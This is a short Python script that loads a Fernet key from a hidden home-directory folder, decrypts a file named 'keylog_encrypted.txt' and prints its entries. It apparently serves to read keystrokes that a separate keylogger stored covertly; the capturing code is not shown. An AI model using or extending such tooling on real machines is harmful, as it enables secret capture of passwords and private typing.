import os
from cryptography.fernet import Fernet

def load_encryption_key():
    # Get the path to the hidden directory
    hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
    encryption_key_file = os.path.join(hidden_dir, "encryption_key.txt")
    
    # Load the encryption key from the file
    with open(encryption_key_file, "rb") as key_file:
        key = key_file.read()
    return key

# Load the encryption key
key = load_encryption_key()
cipher = Fernet(key)

# Read the encrypted log file
hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
encrypted_file = os.path.join(hidden_dir, "keylog_encrypted.txt")
with open(encrypted_file, "rb") as f:
    encrypted_lines = f.readlines()

# Decrypt and print each entry
for encrypted_line in encrypted_lines:
    decrypted_line = cipher.decrypt(encrypted_line).decode()
    print(decrypted_line.strip())  # Remove trailing newline character
